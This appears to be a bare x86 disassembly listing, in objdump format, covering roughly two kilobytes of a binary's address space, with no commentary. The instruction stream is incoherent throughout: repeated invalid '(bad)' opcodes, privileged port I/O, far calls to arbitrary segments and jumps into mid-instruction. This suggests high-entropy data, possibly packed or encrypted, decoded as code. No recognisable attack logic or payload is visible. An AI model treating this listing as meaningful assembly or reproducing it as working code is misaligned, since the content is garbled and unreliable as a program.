  42025c:	xor    DWORD PTR [ecx-0x61],esp
  42025f:	sub    al,0xa3
  420261:	mov    al,ds:0xf77775bc
  420266:	out    dx,al
  420267:	mov    dl,0x4d
  420269:	pop    eax
  42026a:	loopne 0x420204
  42026c:	arpl   WORD PTR [ebx],bx
  42026e:	xor    DWORD PTR [ecx-0x4e6ffdf],esp
  420274:	mov    bl,0x43
  420276:	das    
  420277:	jp     0x4202d7
  420279:	xchg   BYTE PTR [edi-0x69f2dc0f],bh
  42027f:	pop    edi
  420280:	add    eax,0x9fa3d761
  420285:	jmp    0x22eb:0x82df2cbe
  42028c:	pop    ecx
  42028d:	aad    0x5f
  42028f:	inc    esp
  420290:	inc    edx
  420291:	fld    DWORD PTR ds:0x1860d5fd
  420297:	add    al,0x11
  420299:	mov    cl,0x7
  42029b:	mov    ch,0xb9
  42029d:	into   
  42029e:	adc    ah,BYTE PTR [esi-0x4b]
  4202a1:	mov    dh,0xf0
  4202a3:	pop    ebx
  4202a4:	(bad)  
  4202a6:	retf   0xbe63
  4202a9:	cmp    eax,DWORD PTR [ebx+ebp*4+0x5f]
  4202ad:	pop    ebp
  4202ae:	loope  0x420329
  4202b0:	inc    ecx
  4202b1:	dec    ebp
  4202b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202b3:	and    eax,0x2c78e096
  4202b8:	mov    edi,0xacbbeb56
  4202bd:	ror    ah,cl
  4202bf:	in     al,dx
  4202c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202c1:	in     eax,dx
  4202c2:	jns    0x42030d
  4202c4:	je     0x42031a
  4202c6:	(bad)  
  4202c7:	mov    al,ds:0x556196c5
  4202cc:	adc    eax,0x80419ee1
  4202d1:	lahf   
  4202d2:	out    0x97,eax
  4202d4:	lea    ebx,[edi+ebp*8]
  4202d7:	mov    ch,0xfe
  4202d9:	mov    dh,0xab
  4202db:	add    edi,ebp
  4202dd:	pusha  
  4202de:	adc    cl,cl
  4202e0:	jns    0x420338
  4202e2:	daa    
  4202e3:	and    eax,DWORD PTR [bp+si]
  4202e6:	fidivr DWORD PTR [ebp+0x5b]
  4202e9:	dec    DWORD PTR [eax]
  4202eb:	dec    esp
  4202ec:	aas    
  4202ed:	mov    al,ds:0x7c29db0e
  4202f2:	and    esp,DWORD PTR [edx+0x4fc0077b]
  4202f8:	mov    edx,0xac0e2fb
  4202fd:	(bad)  
  4202fe:	in     eax,0xa4
  420300:	pop    ebp
  420301:	jecxz  0x42037f
  420303:	cld    
  420304:	imul   esi,DWORD PTR [edi-0xd],0xd08ba602
  42030b:	mov    al,ds:0x1d9fbba4
  420310:	in     eax,0xb8
  420312:	imul   ebp,DWORD PTR [eax-0x261db0a2],0x7dac1ca9
  42031c:	inc    edx
  42031d:	pusha  
  42031e:	pop    ds
  42031f:	scas   al,BYTE PTR es:[edi]
  420320:	jne    0x420363
  420322:	ror    BYTE PTR [ecx],1
  420324:	dec    edi
  420325:	xor    DWORD PTR [esi],ebp
  420327:	sub    BYTE PTR [esi-0x7a],bl
  42032a:	repz das 
  42032c:	mov    al,ds:0x6ef55dee
  420331:	pop    ecx
  420332:	and    bh,BYTE PTR [esi-0x38]
  420335:	je     0x420358
  420337:	outs   dx,DWORD PTR ds:[esi]
  420338:	jle    0x420326
  42033a:	aas    
  42033b:	ss mov ecx,0x548fdc18
  420341:	sbb    eax,0xa7de990e
  420346:	adc    BYTE PTR [edx+edx*8+0x3c],bh
  42034a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42034b:	mov    eax,ds:0xf41b3643
  420350:	xchg   edi,eax
  420351:	call   0xc7e0:0x415effa8
  420358:	(bad)  
  420359:	leave  
  42035a:	je     0x420382
  42035c:	add    ah,BYTE PTR [ecx-0x65]
  42035f:	and    ch,BYTE PTR ds:0xff6df529
  420365:	xchg   esi,ebp
  420367:	retf   0x1ab7
  42036a:	push   cs
  42036b:	pop    esi
  42036c:	sahf   
  42036d:	adc    BYTE PTR [esi+ebx*4+0x566f47d9],bh
  420374:	pop    esi
  420375:	sub    al,0x43
  420377:	mov    ah,0x3f
  420379:	or     al,0xee
  42037b:	sbb    BYTE PTR [eax],dh
  42037d:	dec    edx
  42037e:	jo     0x4203af
  420380:	mov    al,0x30
  420382:	mov    esp,0x6cf32ca8
  420387:	sub    bh,BYTE PTR [ebx]
  420389:	inc    ebx
  42038a:	(bad)  
  42038b:	ja     0x42032b
  42038d:	pop    edi
  42038e:	lods   al,BYTE PTR ds:[esi]
  42038f:	xchg   edx,eax
  420390:	pop    esi
  420391:	lahf   
  420392:	xor    al,0x84
  420394:	jno    0x4203d4
  420396:	and    eax,0x3a43ae79
  42039b:	mov    al,0x9b
  42039d:	and    BYTE PTR [ebx],ah
  42039f:	mov    dl,0x90
  4203a1:	add    eax,0xe067e6e2
  4203a6:	jb     0x420420
  4203a8:	jmp    0x42040a
  4203aa:	sbb    DWORD PTR [esi-0x6f79ef06],ebp
  4203b0:	sbb    esp,ebp
  4203b2:	sbb    dl,ah
  4203b4:	pop    es
  4203b5:	sub    eax,0xb9357378
  4203ba:	(bad)  
  4203bb:	aas    
  4203bc:	scas   al,BYTE PTR es:[edi]
  4203bd:	repnz out dx,al
  4203bf:	cmp    DWORD PTR [ecx+0x5967f3f8],ebx
  4203c5:	sbb    al,0xbd
  4203c7:	mov    al,ds:0xdebbc9e8
  4203cc:	shr    DWORD PTR [ebx+eax*1],0x40
  4203d0:	pop    esi
  4203d1:	mov    ds:0xff0c2e07,al
  4203d6:	daa    
  4203d7:	push   cs
  4203d8:	mov    edx,0x8cb69c48
  4203dd:	call   0xec60:0xfb5ca052
  4203e4:	mov    eax,ds:0x76f3b68d
  4203e9:	pusha  
  4203ea:	call   0xaf4d:0x892967db
  4203f1:	mov    ds:0xab1e5cee,eax
  4203f6:	ds jecxz 0x42039e
  4203f9:	xchg   esi,eax
  4203fa:	mov    al,ds:0xe8ebf4a8
  4203ff:	xchg   BYTE PTR [edx],bl
  420401:	jno    0x4203a4
  420403:	push   cs
  420404:	cmp    dl,BYTE PTR [ebx-0x7a]
  420407:	neg    DWORD PTR [esi-0x2d]
  42040a:	gs aam 0xcb
  42040d:	fwait
  42040e:	push   ebp
  42040f:	aaa    
  420410:	dec    ebp
  420411:	popa   
  420412:	jbe    0x4203c0
  420414:	clc    
  420415:	stc    
  420416:	fbld   TBYTE PTR cs:[edx]
  420419:	push   edi
  42041a:	cs inc ebx
  42041c:	inc    edx
  42041d:	xlat   BYTE PTR ds:[ebx]
  42041e:	pop    esp
  42041f:	call   DWORD PTR [eax+eiz*2+0x26cb565]
  420426:	outs   dx,DWORD PTR ds:[esi]
  420427:	loop   0x4203f2
  420429:	scas   eax,DWORD PTR es:[edi]
  42042a:	out    dx,al
  42042b:	jge    0x42042a
  42042d:	xchg   esp,esp
  42042f:	stc    
  420430:	(bad)  
  420431:	dec    esi
  420432:	push   esp
  420433:	mov    edi,0xa41fdb51
  420438:	adc    BYTE PTR [ecx+0x2f],ch
  42043b:	pop    es
  42043c:	mov    ds,WORD PTR [edi-0x309aceed]
  420442:	and    edi,edi
  420444:	pop    edx
  420445:	loope  0x42047c
  420447:	cld    
  420448:	out    0xb9,eax
  42044a:	dec    ebp
  42044b:	mov    ds:0x99fff966,al
  420450:	in     al,dx
  420451:	nop
  420452:	adc    BYTE PTR [ebp-0x3],ch
  420455:	sub    bl,0xea
  420458:	imul   edx,DWORD PTR [esi],0x90e2640c
  42045e:	repz sub ebx,DWORD PTR [edx+0xaed675d]
  420465:	ret    
  420466:	dec    esp
  420467:	jne    0x420427
  420469:	cmp    DWORD PTR [ecx+0x19ba5e09],0xf97f1bcf
  420473:	out    dx,eax
  420474:	adc    DWORD PTR [edx-0x2],edx
  420477:	mov    edi,0x1dce0496
  42047c:	cmp    BYTE PTR [edx+0x7c],bh
  42047f:	or     DWORD PTR [esi+0x39],ebx
  420482:	xor    eax,0x36448d34
  420487:	imul   edx,DWORD PTR [ecx],0x6d502c61
  42048d:	cmp    al,0x4f
  42048f:	call   0x5c52:0x94dcdd16
  420496:	hlt    
  420497:	lods   eax,DWORD PTR ds:[esi]
  420498:	sahf   
  420499:	int3   
  42049a:	je     0x420502
  42049c:	sub    BYTE PTR [esi],al
  42049e:	pop    ebp
  42049f:	mov    eax,ds:0x7c85377f
  4204a4:	ins    BYTE PTR es:[edi],dx
  4204a5:	(bad)  
  4204a6:	pop    edi
  4204a7:	mov    ah,0x5e
  4204a9:	stc    
  4204aa:	mov    al,ds:0x1694a9e5
  4204af:	fdivr  DWORD PTR [esp+eax*2+0x10]
  4204b3:	add    al,0xeb
  4204b5:	fisttp QWORD PTR [edx+ebp*2+0xe]
  4204b9:	inc    ecx
  4204ba:	data16 ror BYTE PTR [esi-0x11],cl
  4204be:	out    dx,al
  4204bf:	aaa    
  4204c0:	out    0x8e,eax
  4204c2:	daa    
  4204c3:	mov    edx,0xa1519d53
  4204c8:	pop    ecx
  4204c9:	xchg   DWORD PTR [ebp+0x3d0787ee],esi
  4204cf:	add    al,0x5e
  4204d1:	(bad)  
  4204d2:	fsubr  DWORD PTR [ebx]
  4204d4:	jle    0x42048a
  4204d6:	jmp    0x4204a8
  4204d8:	and    ebx,DWORD PTR [edx-0x7d]
  4204db:	and    BYTE PTR [eax+0x7fc15d2b],cl
  4204e1:	cmc    
  4204e2:	mov    ds:0xea205efa,al
  4204e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204e8:	scas   eax,DWORD PTR es:[edi]
  4204e9:	mov    ss,WORD PTR [ebx]
  4204eb:	push   0x20296102
  4204f0:	lods   al,BYTE PTR ds:[esi]
  4204f1:	es jns 0x420518
  4204f4:	les    ebx,FWORD PTR [eax]
  4204f6:	adc    BYTE PTR [edx+0x21259a1a],cl
  4204fc:	popa   
  4204fd:	leave  
  4204fe:	enter  0x3358,0xd3
  420502:	cmp    ah,BYTE PTR [ecx+0x7a891350]
  420508:	add    DWORD PTR [esi+0x49],ecx
  42050b:	pop    esi
  42050c:	jmp    0x97af:0x3727eeb2
  420513:	sub    edx,DWORD PTR [edi+0x43]
  420516:	pop    ebp
  420517:	mov    ah,0xc3
  420519:	push   ds
  42051a:	fidiv  DWORD PTR [ebp+ebp*4+0x58]
  42051e:	sbb    bh,BYTE PTR [ebp+0x11]
  420521:	leave  
  420522:	in     eax,dx
  420523:	scas   al,BYTE PTR es:[edi]
  420524:	cmp    eax,0x7d800487
  420529:	sub    BYTE PTR [ecx+eiz*1],ah
  42052c:	sbb    DWORD PTR [edi],ebx
  42052e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42052f:	mov    ebx,0x3a122f5b
  420534:	xlat   BYTE PTR ds:[ebx]
  420535:	cli    
  420536:	dec    ebx
  420537:	jmp    0x420547
  420539:	add    DWORD PTR [eax+0x4d610273],edx
  42053f:	call   0x1f86:0x6aed2f90
  420546:	pop    edi
  420547:	and    DWORD PTR [esi+ebx*4],ebp
  42054a:	mov    bl,0x86
  42054c:	in     eax,0xaf
  42054e:	pop    edi
  42054f:	mov    eax,ds:0xdb869c2
  420554:	sub    bh,0x26
  420557:	pop    ss
  420558:	pop    esi
  420559:	js     0x4205b1
  42055b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42055c:	js     0x42057e
  42055e:	fcom   QWORD PTR [ebp-0x16c19ee7]
  420564:	jbe    0x4204fd
  420566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420567:	retf   0xc362
  42056a:	fldcw  WORD PTR [ebx+0x5e]
  42056d:	add    DWORD PTR [edi],ecx
  42056f:	fbld   TBYTE PTR [esi+0x481ba35]
  420575:	popa   
  420576:	mov    ebx,0xd71569af
  42057b:	popa   
  42057c:	aaa    
  42057d:	inc    eax
  42057e:	out    0x87,eax
  420580:	aam    0x75
  420582:	je     0x420509
  420584:	jle    0x4205b2
  420586:	lds    esi,FWORD PTR [eax-0x70]
  420589:	push   ecx
  42058a:	adc    edx,edx
  42058c:	lods   eax,DWORD PTR ds:[esi]
  42058d:	fldln2 
  42058f:	das    
  420590:	arpl   ax,bx
  420592:	inc    esp
  420593:	pop    edx
  420594:	pop    ss
  420595:	mov    eax,ds:0x3a36a896
  42059a:	mov    cl,0xa0
  42059c:	pop    ecx
  42059d:	and    DWORD PTR [ecx+0x3f],esi
  4205a0:	jecxz  0x42054c
  4205a2:	xor    BYTE PTR [esi-0x1e8ac7ae],cl
  4205a8:	sbb    eax,0xc32c1654
  4205ad:	push   ss
  4205ae:	cli    
  4205af:	cmc    
  4205b0:	mov    ecx,0xd3a18610
  4205b5:	or     al,0x2
  4205b7:	je     0x42054d
  4205b9:	adc    al,0x64
  4205bb:	mov    eax,ds:0xe9b30331
  4205c0:	mov    dh,0xdb
  4205c2:	mov    bh,0x60
  4205c4:	pop    ebp
  4205c5:	js     0x4205c2
  4205c7:	mov    ds:0x13f7b22b,al
  4205cc:	mov    dl,BYTE PTR [edx+0x62]
  4205cf:	mov    eax,ds:0x4aa759ae
  4205d4:	(bad)  
  4205d5:	lods   eax,DWORD PTR ds:[esi]
  4205d6:	cmp    eax,0xff9b5e15
  4205db:	imul   bl
  4205dd:	fist   DWORD PTR [ecx]
  4205df:	jmp    0x420562
  4205e1:	pusha  
  4205e2:	loopne 0x4205ee
  4205e4:	fisubr WORD PTR [ebx]
  4205e6:	cwde   
  4205e7:	mov    bh,0xbe
  4205e9:	cmp    al,0xf0
  4205eb:	push   edi
  4205ec:	and    BYTE PTR [ebp+ebp*1+0x73],bl
  4205f0:	arpl   WORD PTR [ecx-0x1d36df41],di
  4205f6:	jecxz  0x420652
  4205f8:	mov    edi,0x454a9a60
  4205fd:	aas    
  4205fe:	stos   DWORD PTR es:[edi],eax
  4205ff:	out    dx,eax
  420600:	icebp  
  420601:	int    0xee
  420603:	sub    al,0x7d
  420605:	fstp   TBYTE PTR [edx+0x25]
  420608:	cs push esp
  42060a:	inc    ebx
  42060b:	mov    ds:0xcea4f3bb,al
  420610:	mov    ds:0x8e593788,eax
  420615:	in     al,dx
  420616:	out    dx,al
  420617:	sar    BYTE PTR [ebp-0x3d58b438],1
  42061d:	fst    QWORD PTR [ebp+0x7108afa8]
  420623:	neg    BYTE PTR [ebp+0x71]
  420626:	dec    eax
  420627:	pop    eax
  420628:	push   ecx
  420629:	gs in  eax,dx
  42062b:	shl    DWORD PTR [edi-0x3c],0x3a
  42062f:	sbb    cl,BYTE PTR [edx]
  420631:	cmc    
  420632:	or     DWORD PTR [ecx],0x6b311fa2
  420638:	loope  0x4206a2
  42063a:	cmp    DWORD PTR [ecx],esp
  42063c:	in     al,0x7b
  42063e:	jl     0x420687
  420640:	mov    dl,0x1a
  420642:	add    DWORD PTR [edx-0x78a3d641],esp
  420648:	lods   al,BYTE PTR ds:[esi]
  420649:	xchg   edx,eax
  42064a:	sub    DWORD PTR [esi+eax*8+0x59],esi
  42064e:	fs mov ebp,0x1d69ba5e
  420654:	pop    ds
  420655:	sub    ebx,DWORD PTR [ebx]
  420657:	adc    al,dh
  420659:	pop    ebp
  42065a:	mov    gs,esp
  42065c:	xchg   esi,eax
  42065d:	lea    ecx,ds:0x9b91d6eb
  420663:	mov    DWORD PTR [esi+0x3f],ebx
  420666:	mov    bh,0x51
  420668:	or     dl,BYTE PTR [esi+edi*2]
  42066b:	int    0x2b
  42066d:	push   edx
  42066e:	lods   eax,DWORD PTR ds:[esi]
  42066f:	test   BYTE PTR [esi-0x27],ch
  420672:	ret    0x7f60
  420675:	xchg   edx,eax
  420676:	cmp    al,0x67
  420678:	adc    ebp,DWORD PTR [edx]
  42067a:	out    dx,al
  42067b:	mov    ecx,0x629dd375
  420680:	add    ebx,DWORD PTR [ebx+edi*4]
  420683:	mov    al,ds:0x4aade4d
  420688:	mov    cl,0xcf
  42068a:	jne    0x4206c0
  42068c:	pop    esi
  42068d:	dec    edi
  42068e:	je     0x4206b7
  420690:	popa   
  420691:	(bad)  
  420692:	sbb    DWORD PTR [edi-0x29],0x178ebd60
  420699:	popf   
  42069a:	sbb    dh,ch
  42069c:	mov    bl,0x7a
  42069e:	es loopne 0x42064e
  4206a1:	pusha  
  4206a2:	adc    al,0xb5
  4206a4:	xor    BYTE PTR [ebp+0x7f],dl
  4206a7:	ins    BYTE PTR es:[edi],dx
  4206a8:	fisub  WORD PTR [eax-0x21]
  4206ab:	and    edi,ebp
  4206ad:	es push ebx
  4206af:	mov    al,BYTE PTR [edi-0x5e]
  4206b2:	out    dx,al
  4206b3:	sub    dh,BYTE PTR [esp+edx*8+0x5c6ac9d4]
  4206ba:	mov    ebx,0x781e91a0
  4206bf:	(bad)  
  4206c0:	or     eax,DWORD PTR [ebp+0x485ed653]
  4206c6:	jge    0x420661
  4206c8:	xchg   ebx,eax
  4206c9:	mov    esi,0x60225f5b
  4206ce:	and    DWORD PTR [ecx+0x40],edx
  4206d1:	mov    eax,ds:0xb0136394
  4206d6:	retf   
  4206d7:	push   eax
  4206d8:	pop    edx
  4206d9:	es out dx,al
  4206db:	push   es
  4206dc:	dec    eax
  4206dd:	in     eax,dx
  4206de:	mov    ebx,0xefd447a3
  4206e3:	mov    al,ds:0x3dba779d
  4206e8:	pop    ebx
  4206e9:	pop    ds
  4206ea:	in     eax,0x79
  4206ec:	pop    esi
  4206ed:	xchg   esp,eax
  4206ee:	ins    DWORD PTR es:[edi],dx
  4206ef:	fbld   TBYTE PTR [edi]
  4206f1:	cli    
  4206f2:	jnp    0x4206c2
  4206f4:	jb     0x420720
  4206f6:	mov    ds:0xb40857a5,eax
  4206fb:	push   esi
  4206fc:	loop   0x4206b4
  4206fe:	outs   dx,BYTE PTR ds:[esi]
  4206ff:	sub    ch,BYTE PTR [edx+0x24]
  420702:	push   ebx
  420703:	cmc    
  420704:	rcr    DWORD PTR [esi-0x6d],0xda
  420708:	mov    ds:0x9e566b6c,eax
  42070d:	xor    eax,0xe15e2e81
  420712:	aas    
  420713:	fidivr WORD PTR [edx+ebp*1+0x2b]
  420717:	fwait
  420718:	loope  0x42076b
  42071a:	add    al,BYTE PTR [ecx]
  42071c:	ja     0x420783
  42071e:	out    dx,al
  42071f:	push   ss
  420720:	(bad)
  420726:	add    eax,0x4007fb71
  42072b:	fwait
  42072c:	dec    esi
  42072d:	popa   
  42072e:	sti    
  42072f:	in     eax,dx
  420730:	cld    
  420731:	pop    ebx
  420732:	dec    edi
  420733:	sbb    BYTE PTR [ebx+0x7d25eedc],dh
  420739:	lahf   
  42073a:	dec    ebx
  42073b:	jo     0x420762
  42073d:	pop    ecx
  42073e:	jne    0x4206e1
  420740:	sbb    dh,0x94
  420743:	pop    esi
  420744:	aam    0xa4
  420746:	push   esp
  420747:	lea    ebx,[esi-0x6a]
  42074a:	push   es
  42074b:	jbe    0x42078e
  42074d:	mov    ebx,0x614d6a47
  420752:	fist   DWORD PTR [ecx]
  420754:	sub    eax,0x159d0b5
  420759:	add    dl,BYTE PTR [edx+0x61]
  42075c:	pop    esi
  42075d:	(bad)  
  42075e:	jb     0x4207bf
  420760:	es add al,0xf5
  420763:	pop    ebx
  420764:	imul   eax,DWORD PTR [edx-0x6c],0x9adebd8c
  42076b:	out    0xcb,eax
  42076d:	(bad)  
  42076e:	scas   al,BYTE PTR es:[edi]
  42076f:	cmc    
  420770:	cld    
  420771:	push   ebx
  420772:	add    BYTE PTR [edx],bh
  420774:	xchg   edi,eax
  420775:	or     al,0x27
  420777:	mov    cl,0xd1
  420779:	imul   ecx,DWORD PTR [ecx+ecx*4+0x76],0x20
  42077e:	cmp    edx,esi
  420780:	jp     0x42076a
  420782:	stos   BYTE PTR es:[edi],al
  420783:	mov    al,ds:0x94ad5e87
  420788:	in     al,dx
  420789:	sub    eax,0xae5ed339
  42078e:	imul   ebp,eax,0xffffffbd
  420791:	cmp    al,BYTE PTR [ebp+0x1563d0df]
  420797:	test   eax,0xfcee42a6
  42079c:	mov    al,es:0xfb7db912
  4207a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207a3:	pop    es
  4207a4:	pop    ebp
  4207a5:	jg     0x420757
  4207a7:	data16 xlat BYTE PTR ds:[ebx]
  4207a9:	nop
  4207aa:	mov    ds:0x32ebf,eax
  4207af:	mov    eax,ds:0xbb0fb7a2
  4207b4:	aaa    
  4207b5:	push   esi
  4207b6:	jae    0x4207a5
  4207b8:	pop    esi
  4207b9:	xor    bl,BYTE PTR [edx+0x37503c0c]
  4207bf:	jge    0x420831
  4207c1:	pusha  
  4207c2:	sub    al,0xf5
  4207c4:	loope  0x420749
  4207c6:	pop    edx
  4207c7:	pop    ss
  4207c8:	jae    0x4207c4
  4207ca:	out    dx,al
  4207cb:	pop    esi
  4207cc:	jmp    FWORD PTR [edi+0x2b]
  4207cf:	cwde   
  4207d0:	vmread DWORD PTR [edi],edx
  4207d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207d4:	xor    BYTE PTR [edi+0x64],bl
  4207d7:	pop    ds
  4207d8:	scas   al,BYTE PTR es:[edi]
  4207d9:	pushf  
  4207da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207db:	push   0x27ee9288
  4207e0:	test   edx,edi
  4207e2:	cmp    eax,0x69b5f050
  4207e7:	cwde   
  4207e8:	(bad)  
  4207e9:	jp     0x4207e5
  4207eb:	mov    al,ds:0xb08f6778
  4207f0:	push   ds
  4207f1:	jmp    0x4207e0
  4207f3:	sub    cl,BYTE PTR [edi+eiz*4-0x3a43aafe]
  4207fa:	bound  esp,QWORD PTR [ebx+0xa]
  4207fd:	pop    edx
  4207fe:	lods   al,BYTE PTR ds:[esi]
  4207ff:	ins    DWORD PTR es:[edi],dx
  420800:	jle    0x4207c8
  420802:	adc    ah,BYTE PTR [ecx-0x1b]
  420805:	fcom   QWORD PTR ds:0xfc2d5ec4
  42080b:	dec    ebp
  42080c:	lods   al,BYTE PTR ds:[esi]
  42080d:	daa    
  42080e:	dec    edi
  42080f:	das    
  420810:	stos   BYTE PTR es:[edi],al
  420811:	pusha  
  420812:	daa    
  420813:	dec    eax
  420814:	cwde   
  420815:	push   ebx
  420816:	mov    WORD PTR [edi-0x411f10a],cs
  42081c:	into   
  42081d:	cmp    ebx,DWORD PTR [esi]
  42081f:	add    ebp,DWORD PTR [ecx]
  420821:	in     al,dx
  420822:	inc    esi
  420823:	mov    eax,ds:0x22012b69
  420828:	ja     0x42089e
  42082a:	dec    edi
  42082b:	sahf   
  42082c:	pusha  
  42082d:	pop    edx
  42082e:	mov    bl,0xf4
  420830:	adc    dh,BYTE PTR [ebp+0x79dee0b2]
  420836:	aaa    
  420837:	mov    eax,ds:0x4030a18c
  42083c:	jnp    0x420805
  42083e:	clc    
  42083f:	call   FWORD PTR [esi+0x28]
  420842:	arpl   ax,bp
  420844:	or     esi,ebx
  420846:	mov    esp,DWORD PTR [edx+0x4af060bd]
  42084c:	ins    DWORD PTR es:[edi],dx
  42084d:	mov    esi,0xae28a875
  420852:	out    dx,al
  420853:	fs hlt 
  420855:	call   0xe37e1563
  42085a:	inc    eax
  42085b:	mov    eax,ds:0x1ef40e33
  420860:	mov    edi,DWORD PTR [edi+0x3d5e336f]
  420866:	les    eax,FWORD PTR [eax+0x4f]
  420869:	jmp    0x420808
  42086b:	std    
  42086c:	push   ss
  42086d:	popa   
  42086e:	push   ebp
  42086f:	je     0x420866
  420871:	add    ah,BYTE PTR [ecx-0x55]
  420874:	sar    bl,1
  420876:	out    dx,al
  420877:	sub    edi,DWORD PTR [ebx*8+0x23a4189f]
  42087e:	aam    0xa3
  420880:	xchg   ebp,eax
  420881:	dec    eax
  420882:	je     0x4208f0
  420884:	aad    0x5
  420886:	dec    ecx
  420887:	mov    eax,ds:0x2e18f9a0
  42088c:	and    al,BYTE PTR [ecx-0x2aa65c12]
  420892:	inc    ebx
  420893:	inc    ebp
  420894:	sbb    DWORD PTR [ebp+ebp*2-0x5f],edx
  420898:	outs   dx,BYTE PTR ds:[esi]
  420899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42089a:	ret    
  42089b:	mov    cs,ebx
  42089d:	sbb    bh,BYTE PTR [ebp+0xe3f5e6f]
  4208a3:	dec    ebp
  4208a4:	cli    
  4208a5:	jbe    0x420849
  4208a7:	sbb    eax,0xeb556147
  4208ac:	and    BYTE PTR [edi-0x32136f3],dh
  4208b2:	out    dx,al
  4208b3:	ret    
  4208b4:	fs xchg ebx,eax
  4208b6:	gs loope 0x4208a2
  4208b9:	sub    BYTE PTR [eax-0x9],bh
  4208bc:	and    eax,0xc3a2d153
  4208c1:	stc    
  4208c2:	lock dec esi
  4208c4:	lahf   
  4208c5:	adc    al,0xcb
  4208c7:	inc    ecx
  4208c8:	(bad)  
  4208c9:	ins    BYTE PTR es:[edi],dx
  4208ca:	xor    BYTE PTR [edx],0x4c
  4208cd:	mov    DWORD PTR [ebp-0x11],ebx
  4208d0:	dec    edi
  4208d1:	icebp  
  4208d2:	(bad)  
  4208d3:	cmp    eax,0xa767db9e
  4208d8:	scas   eax,DWORD PTR es:[edi]
  4208d9:	ins    DWORD PTR es:[edi],dx
  4208da:	test   eax,0x5c9c5ba0
  4208df:	jl     0x42095e
  4208e1:	cmc    
  4208e2:	shrd   DWORD PTR [esi+0x6],ebx,cl
  4208e6:	cld    
  4208e7:	push   ss
  4208e8:	(bad)  
  4208e9:	std    
  4208ea:	push   ss
  4208eb:	dec    esi
  4208ec:	popa   
  4208ed:	popa   
  4208ee:	cmp    al,0x4a
  4208f0:	call   0xffe737c4
  4208f5:	add    al,0xea
  4208f7:	fisubr DWORD PTR [edi+eax*2]
  4208fa:	idiv   DWORD PTR ds:0x28f95a9f
  420900:	add    al,0xf8
  420902:	jb     0x4208a8
  420904:	imul   edi,ecx,0x93d1070b
  42090a:	mov    ds,WORD PTR [edx-0x22]
  42090d:	shl    bh,cl
  42090f:	push   eax
  420910:	mov    cl,0x1e
  420912:	out    0x10,al
  420914:	scas   al,BYTE PTR es:[edi]
  420915:	pop    ebx
  420916:	cmp    eax,0x63609fd1
  42091b:	fwait
  42091c:	int3   
  42091d:	xchg   edi,eax
  42091e:	and    eax,0xeee5df50
  420923:	in     al,dx
  420924:	adc    al,al
  420926:	stc    
  420927:	je     0x4208ef
  420929:	adc    edx,edx
  42092b:	mov    al,ds:0x520d82a3
  420930:	(bad)  
  420932:	icebp  
  420933:	cmp    ebx,DWORD PTR [esi+0x7f]
  420936:	xor    DWORD PTR [eax],ebp
  420938:	lods   eax,DWORD PTR ds:[esi]
  420939:	jo     0x42091a
  42093b:	fst    QWORD PTR [edi+0x257d560]
  420941:	inc    edi
  420942:	fisttp QWORD PTR [eax]
  420944:	cmc    
  420945:	ret    
  420946:	out    dx,al
  420947:	adc    al,0xeb
  420949:	dec    ebp
  42094a:	jle    0x420938
  42094c:	jl     0x4208cf
  42094e:	sub    BYTE PTR [ecx+0x35694f14],ah
  420954:	inc    ecx
  420955:	dec    esp
  420956:	and    DWORD PTR [esi+ebx*4-0x42],esp
  42095a:	cmp    al,0x81
  42095c:	jmp    0x11e2e63b
  420961:	mov    edx,0x84868db4
  420966:	and    ah,BYTE PTR [ebp+0x5e]
  420969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42096a:	pusha  
  42096b:	minps  xmm6,xmm6
  42096e:	or     ah,BYTE PTR [esi-0x61]
  420971:	jb     0x4208f6
  420973:	pusha  
  420974:	stos   BYTE PTR es:[edi],al
  420975:	push   edx
  420976:	(bad)  
  420977:	sbb    bh,BYTE PTR [esi+0x237d4131]
  42097d:	mov    ds:0x99fb5cee,eax
  420982:	in     eax,dx
  420983:	dec    esp
  420984:	mov    ebx,0x199ede48
  420989:	mov    dl,0xfd
  42098b:	leave  
  42098c:	das    
  42098d:	popa   
  42098e:	bound  edi,QWORD PTR [ecx-0x5dc0446c]
  420994:	jp     0x420920
  420996:	out    dx,al
  420997:	pusha  
  420998:	je     0x42097d
  42099a:	jle    0x4209b9
  42099c:	clc    
  42099d:	cmp    eax,0xc0728415
  4209a2:	shl    BYTE PTR [eax-0x3bdf0b1f],cl
  4209a8:	ja     0x4209e9
  4209aa:	xchg   ebp,edx
  4209ac:	push   ecx
  4209ad:	cmp    al,0xc8
  4209af:	push   ss
  4209b0:	fidiv  WORD PTR [esp+eax*1-0x7d]
  4209b4:	jo     0x4209df
  4209b6:	xor    al,0xa1
  4209b8:	dec    ebp
  4209b9:	xchg   DWORD PTR [ebx],eax
  4209bb:	mov    dh,BYTE PTR [edi+0x69]
  4209be:	pushf  
  4209bf:	mov    ds,WORD PTR [esi-0x4b]
  4209c2:	dec    dx
  4209c4:	xor    al,0xff
  4209c6:	dec    esp
  4209c7:	sub    al,0xea
  4209c9:	pusha  
  4209ca:	dec    ecx
  4209cb:	cmp    al,0xec
  4209cd:	inc    ebp
  4209ce:	push   ebx
  4209cf:	retf   
  4209d0:	pushf  
  4209d1:	adc    edx,ebp
  4209d3:	shl    BYTE PTR [ebp-0x61d61dee],0xc9
  4209da:	adc    dh,BYTE PTR [edx]
  4209dc:	adc    al,0xbf
  4209de:	mov    fs:0x195b0e1a,al
  4209e4:	inc    ebp
  4209e5:	mov    esp,0x6cc350c1
  4209ea:	out    dx,al
  4209eb:	cld    
  4209ec:	jp     0x4209d3
  4209ee:	js     0x4209ff
  4209f0:	adc    eax,0xbde9fbab
  4209f5:	pusha  
  4209f6:	les    ecx,FWORD PTR [edi]
  4209f8:	push   ebx
  4209f9:	(bad)  
  4209fa:	mov    esp,0xee8c481f
  4209ff:	(bad)  
  420a01:	lahf   
  420a02:	and    eax,0x244bfa91
  420a07:	mov    al,ds:0x4d264e12
